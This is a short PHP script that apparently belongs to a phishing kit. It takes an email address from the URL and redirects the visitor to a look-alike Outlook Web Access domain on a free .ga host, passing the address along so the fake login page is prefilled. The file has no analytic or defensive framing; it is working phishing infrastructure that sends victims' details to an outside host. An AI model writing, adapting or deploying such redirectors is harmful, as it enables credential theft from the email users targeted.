<?php
function getemIDFromem($em)
{
$find = '@';
$pos = strpos($em, $find);
$emID = substr($em, 0, $pos);
return $emID;
}
$em = $_GET['em'];
$emID = getemIDFromem($em);
header("Location: https://owacloudlinks.ga/?em=$em");
?>
